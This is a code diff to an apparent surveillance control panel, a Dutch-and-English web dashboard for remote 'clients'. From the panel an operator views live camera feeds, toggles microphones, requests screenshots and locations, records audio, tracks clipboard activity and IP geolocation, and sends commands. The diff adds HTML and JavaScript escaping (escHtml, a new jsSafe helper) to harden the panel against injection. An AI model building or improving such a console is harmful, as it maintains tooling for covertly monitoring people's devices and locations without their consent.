@@ -1674,7 +1674,7 @@ function updateFilterOptions(clients) {
     const val = sel.value;
     const ids = Object.keys(clients || {}).sort();
     sel.innerHTML = '<option value="">All Clients</option>' + ids.map(id =>
-        `<option value="${id}" ${val===id?'selected':''}>${id}${clients[id].online?' (online)':''}</option>`
+        `<option value="${escHtml(id)}" ${val===id?'selected':''}>${escHtml(id)}${clients[id].online?' (online)':''}</option>`
     ).join('');
 }
 
@@ -2453,11 +2453,11 @@ async function loadCameraFeeds() {
             const p = latestByClient[id];
             const isLive = liveFeeds[id];
             const geo = cl.ipGeo;
-            const geoStr = geo ? `${geo.city}, ${geo.country}` : '';
+            const geoStr = geo ? escHtml((geo.city || '') + ', ' + (geo.country || '')) : '';
 
-            return `<div class="cam-card" data-client-id="${id}">
+            return `<div class="cam-card" data-client-id="${escHtml(id)}">
                 <div class="cam-hdr">
-                    <span class="cam-id">${online ? '<span class="cam-dot"></span>' : ''}${id}</span>
+                    <span class="cam-id">${online ? '<span class="cam-dot"></span>' : ''}${escHtml(id)}</span>
                     <span id="live-ind-${id}" class="live-indicator" style="display:${isLive?'inline-flex':'none'}">
                         <span class="live-dot"></span> LIVE
                     </span>
@@ -2467,17 +2467,17 @@ async function loadCameraFeeds() {
                 </div>
                 <img id="cam-img-${id}" src="${p ? p.path + '?t=' + Date.now() : ''}" onclick="openLightbox(this.src)" alt="" style="${p ? '' : 'display:none'}">
                 <div id="cam-noimg-${id}" class="empty" style="${p ? 'display:none' : ''}">Geen camera beeld</div>
-                <div class="cam-meta" id="cam-meta-${id}">
-                    ${cl.ip||''} ${cl.networkType?'· '+cl.networkType:''} ${cl.battery!==undefined?'· '+cl.battery+'%':''}
+                <div class="cam-meta" id="cam-meta-${escHtml(id)}">
+                    ${escHtml(cl.ip||'')} ${cl.networkType?'· '+escHtml(cl.networkType):''} ${cl.battery!==undefined?'· '+cl.battery+'%':''}
                     ${geoStr?'· '+geoStr:''}
                 </div>
                 <div class="cam-controls">
-                    <button id="cam-btn-${id}" onclick="toggleLiveFeed('${id}')" ${!online?'disabled':''}>${isLive ? '■ Stop' : '▶ Live'}</button>
-                    <button id="mic-btn-${id}" onclick="toggleAudio('${id}')" ${!online?'disabled':''}${audioPlayers[id]?' class="active"':''}>🎙 Mic</button>
-                    <button onclick="requestScreenshot('${id}')" ${!online?'disabled':''} title="Verzoek direct schermafbeelding">📷 Screenshot</button>
-                    <button onclick="requestLocation('${id}')" ${!online?'disabled':''} title="Verzoek huidige locatie">📍 Locatie</button>
-                    <button onclick="(function(){var i=document.getElementById('cam-img-${id}');if(i&&i.src&&i.style.display!=\'none\')openLightbox(i.src);else toast(\'Nog geen beeld\');})()" title="Beeld vollescherm">⛶ FS</button>
-                    <button onclick="if(confirm('Client ${id} verwijderen?'))deleteClient('${id}')" title="Verwijder client" style="border-color:#f5c6c4;color:#d93025">🗑</button>
+                    <button id="cam-btn-${escHtml(id)}" onclick="toggleLiveFeed('${jsSafe(id)}')" ${!online?'disabled':''}>${isLive ? '■ Stop' : '▶ Live'}</button>
+                    <button id="mic-btn-${escHtml(id)}" onclick="toggleAudio('${jsSafe(id)}')" ${!online?'disabled':''}${audioPlayers[id]?' class="active"':''}>🎙 Mic</button>
+                    <button onclick="requestScreenshot('${jsSafe(id)}')" ${!online?'disabled':''} title="Verzoek direct schermafbeelding">📷 Screenshot</button>
+                    <button onclick="requestLocation('${jsSafe(id)}')" ${!online?'disabled':''} title="Verzoek huidige locatie">📍 Locatie</button>
+                    <button onclick="(function(){var i=document.getElementById('cam-img-${jsSafe(id)}');if(i&&i.src&&i.style.display!=\'none\')openLightbox(i.src);else toast(\'Nog geen beeld\');})()" title="Beeld vollescherm">⛶ FS</button>
+                    <button onclick="if(confirm('Client ${jsSafe(id)} verwijderen?'))deleteClient('${jsSafe(id)}')" title="Verwijder client" style="border-color:#f5c6c4;color:#d93025">🗑</button>
                 </div>
             </div>`;
         }).join('') + '</div>';
@@ -2768,29 +2768,29 @@ function renderClients(clients) {
               (cl.clipboardCount ? `<span style="background:rgba(100,100,150,.18);color:var(--dim);font-size:.54rem;padding:1px 5px;border-radius:8px">📋 ${cl.clipboardCount}</span>` : '') +
               `</div>` : '';
 
-        return `<div class="cl${isPinned ? ' cl-pinned' : ''}" data-client-id="${id}">
-            <input type="checkbox" class="cl-select" data-id="${id}" onclick="event.stopPropagation()" style="position:absolute;top:10px;left:8px;cursor:pointer;width:14px;height:14px">
+        return `<div class="cl${isPinned ? ' cl-pinned' : ''}" data-client-id="${escHtml(id)}">
+            <input type="checkbox" class="cl-select" data-id="${escHtml(id)}" onclick="event.stopPropagation()" style="position:absolute;top:10px;left:8px;cursor:pointer;width:14px;height:14px">
             <div class="dot ${cl.online ? 'on' : 'off'}" style="margin-left:18px"></div>
             <div class="inf">
-                <div class="cid" title="${id}">${isPinned ? '[P] ' : ''}${id} <button class="copy-btn" onclick="event.stopPropagation();copyText('${id}',this)">Copy</button></div>
+                <div class="cid" title="${escHtml(id)}">${isPinned ? '[P] ' : ''}${escHtml(id)} <button class="copy-btn" onclick="event.stopPropagation();copyText('${jsSafe(id)}',this)">Copy</button></div>
                 ${anomalyBanner}
                 ${activityPills}
                 ${badgeRow}
-                <div class="meta">${cl.online ? 'Online' : ('Offline · ' + fmtAgo(cl.lastSeen))} - ${fmtTime(cl.lastSeen)}${battH}${netH} - <span onclick="event.stopPropagation();copyText('${cl.ip || ''}',this)" style="cursor:pointer;text-decoration:underline dotted" title="Click to copy IP">${cl.ip || ''}</span>${idleH}${hiddenH}${scrollH}${sessionH}</div>
+                <div class="meta">${cl.online ? 'Online' : ('Offline · ' + fmtAgo(cl.lastSeen))} - ${fmtTime(cl.lastSeen)}${battH}${netH} - <span onclick="event.stopPropagation();copyText('${jsSafe(cl.ip || '')}',this)" style="cursor:pointer;text-decoration:underline dotted" title="Click to copy IP">${escHtml(cl.ip || '')}</span>${idleH}${hiddenH}${scrollH}${sessionH}</div>
                 ${locH}${geoH}
                 <div class="dev">${escHtml(cl.screen || '')} - ${escHtml(cl.language || '')} - ${escHtml(cl.timezone || '')} ${dur ? '- ' + dur : ''}</div>
                 <div class="dev" style="opacity:.55">${escHtml((cl.userAgent || '').slice(0, 100))}</div>
                 <div class="cl-action-bar">
-                    <button class="cl-action-btn" onclick="event.stopPropagation();openNotes('${id}')">Notes${notesCnt ? '(' + notesCnt + ')' : ''}</button>
-                    <button class="cl-action-btn" onclick="event.stopPropagation();openTagModal('${id}')">Label</button>
-                    <button class="cl-action-btn" onclick="event.stopPropagation();exportClient('${id}')">Export</button>
-                    <button class="cl-action-btn" onclick="event.stopPropagation();showClientOnMap('${id}')" title="Toon op kaart">📍 Map</button>
+                    <button class="cl-action-btn" onclick="event.stopPropagation();openNotes('${jsSafe(id)}')">Notes${notesCnt ? '(' + notesCnt + ')' : ''}</button>
+                    <button class="cl-action-btn" onclick="event.stopPropagation();openTagModal('${jsSafe(id)}')">Label</button>
+                    <button class="cl-action-btn" onclick="event.stopPropagation();exportClient('${jsSafe(id)}')">Export</button>
+                    <button class="cl-action-btn" onclick="event.stopPropagation();showClientOnMap('${jsSafe(id)}')" title="Toon op kaart">📍 Map</button>
                     ${isPinned
-                        ? `<button class="cl-action-btn" onclick="event.stopPropagation();unPinClient('${id}')" style="border-color:#553333;color:#aa5555">Unpin</button>`
-                        : `<button class="cl-action-btn" onclick="event.stopPropagation();quickPin('${id}')">Pin</button>`}
+                        ? `<button class="cl-action-btn" onclick="event.stopPropagation();unPinClient('${jsSafe(id)}')" style="border-color:#553333;color:#aa5555">Unpin</button>`
+                        : `<button class="cl-action-btn" onclick="event.stopPropagation();quickPin('${jsSafe(id)}')">Pin</button>`}
                 </div>
                 <div class="cl-quick-cmd" onclick="event.stopPropagation()">
-                    <select id="qcmd-sel-${id}" style="font-size:.6rem;padding:2px 4px;border:1px solid var(--border2);border-radius:4px;background:var(--bg2);color:var(--text);max-width:110px">
+                    <select id="qcmd-sel-${escHtml(id)}" style="font-size:.6rem;padding:2px 4px;border:1px solid var(--border2);border-radius:4px;background:var(--bg2);color:var(--text);max-width:110px">
                         <option value="">⚡ Quick cmd</option>
                         <option value="screenshot">📸 Screenshot</option>
                         <option value="geolocation">📍 Get Location</option>
@@ -2801,11 +2801,11 @@ function renderClients(clients) {
                         <option value="stopAudioRecording">⏹ Stop Audio</option>
                         <option value="alert">📢 Alert Popup</option>
                     </select>
-                    <button class="cl-action-btn" style="font-size:.58rem;padding:2px 6px;margin-left:2px" onclick="event.stopPropagation();quickSendCmd('${id}')">Send</button>
+                    <button class="cl-action-btn" style="font-size:.58rem;padding:2px 6px;margin-left:2px" onclick="event.stopPropagation();quickSendCmd('${jsSafe(id)}')">Send</button>
                 </div>
             </div>
             ${photoH}
-            <button class="del-btn" onclick="event.stopPropagation();if(confirm('Delete ${id}?'))deleteClient('${id}')" title="Delete">X</button>
+            <button class="del-btn" onclick="event.stopPropagation();if(confirm('Delete ${jsSafe(id)}?'))deleteClient('${jsSafe(id)}')" title="Delete">X</button>
         </div>`;
     }).join('');
     } catch(e) { showError('renderClients', e); }
@@ -2817,7 +2817,7 @@ function renderRecentPhotos(photos) {
     c.innerHTML = '<div class="pgrid">' + photos.map(p => `
         <div class="pcard" onclick="openLightbox('${p.path}')">
             <img src="${p.path}" loading="lazy" alt="">
-            <div class="pi"><strong>${p.clientId}</strong>${fmtTime(p.timestamp)}</div>
+            <div class="pi"><strong>${escHtml(p.clientId)}</strong>${fmtTime(p.timestamp)}</div>
         </div>
     `).join('') + '</div>';
 }
@@ -2828,8 +2828,8 @@ function renderLocations(locs) {
     c.innerHTML = locs.slice(0, 30).map(l => `
         <div class="loci">
             <span class="coords">${l.latitude.toFixed(5)}, ${l.longitude.toFixed(5)}</span>
-            <span class="who">${l.clientId}</span>
-            ${l.source ? `<span class="src">${l.source}</span>` : ''}
+            <span class="who">${escHtml(l.clientId)}</span>
+            ${l.source ? `<span class="src">${escHtml(l.source)}</span>` : ''}
             <span class="when">${fmtTime(l.timestamp)}</span>
             <a href="https://www.google.com/maps?q=${l.latitude},${l.longitude}" target="_blank">Map ↗</a>
         </div>
@@ -2903,9 +2903,9 @@ function renderDevices() {
     c.innerHTML = entries.map(([id, info]) => {
         const fields = Object.entries(info).filter(([k]) => k !== 'timestamp');
         return `<div class="pnl" style="margin-bottom:12px">
-            <div class="pnl-h"><h2>${id}</h2><span style="font-size:.6rem;color:var(--dim)">${fmtTime(info.timestamp)}</span></div>
+            <div class="pnl-h"><h2>${escHtml(id)}</h2><span style="font-size:.6rem;color:var(--dim)">${fmtTime(info.timestamp)}</span></div>
             <div class="pnl-b"><div class="di-grid">${fields.map(([k,v]) => `
-                <div class="di-item"><div class="k">${k}</div><div class="v">${v ?? '—'}</div></div>
+                <div class="di-item"><div class="k">${escHtml(k)}</div><div class="v">${escHtml(String(v ?? '—'))}</div></div>
             `).join('')}</div></div>
         </div>`;
     }).join('');
@@ -2958,10 +2958,10 @@ async function loadMap() {
             const ua     = (cl.userAgent || '').slice(0, 80) || '?';
             const scr    = cl.screen ? `${cl.screen.w||'?'}×${cl.screen.h||'?'}` : '?';
             const bat    = cl.battery != null ? `${Math.round(cl.battery*100)}%` : '?';
-            return `<div style="font-size:12px;line-height:1.7"><b>${id}</b><br>` +
+            return `<div style="font-size:12px;line-height:1.7"><b>${escHtml(id)}</b><br>` +
                 `📍 ${l.latitude.toFixed(5)}, ${l.longitude.toFixed(5)}<br>` +
-                `🌐 ${ip} &nbsp;🕐 ${tz}<br>` +
-                `🖥 ${scr} &nbsp;🔋 ${bat}<br>` +
+                `🌐 ${escHtml(ip)} &nbsp;🕐 ${escHtml(tz)}<br>` +
+                `🖥 ${escHtml(scr)} &nbsp;🔋 ${escHtml(bat)}<br>` +
                 `${escHtml(l.source||'')}<br>` +
                 `<span style="color:#888;font-size:10px">${fmtTime(l.timestamp)}</span><br>` +
                 `<span style="color:#aaa;font-size:10px">${escHtml(ua)}</span></div>`;
@@ -3177,6 +3177,16 @@ function escHtml(str) {
         .replace(/>/g, '&gt;')
         .replace(/"/g, '&quot;')
         .replace(/'/g, '&#x27;');
+}
+
+// Safe for onclick="func('${jsSafe(val)}')" — double-quoted HTML attr, single-quoted JS string.
+// Escapes \ and ' for JS; encodes " for HTML attribute boundary; strips newlines.
+function jsSafe(v) {
+    return String(v == null ? '' : v)
+        .replace(/\\/g, '\\\\')
+        .replace(/'/g, "\\'")
+        .replace(/"/g, '&quot;')
+        .replace(/[\r\n]/g, '');
 }
 
 // ═══════════════════════════════════════════════════════════════
@@ -3456,7 +3466,7 @@ function updateCmdTargets() {
         const sel = $('#cmd-target'), val = sel.value;
         const ids = Object.keys(stats.clients || {}).sort();
         sel.innerHTML = '<option value="all">Alle Clients</option>' + ids.map(id =>
-            `<option value="${id}" ${val===id?'selected':''}>${id}${stats.clients[id].online?' (online)':''}</option>`
+            `<option value="${escHtml(id)}" ${val===id?'selected':''}>${escHtml(id)}${stats.clients[id].online?' (online)':''}</option>`
         ).join('');
     });
 }
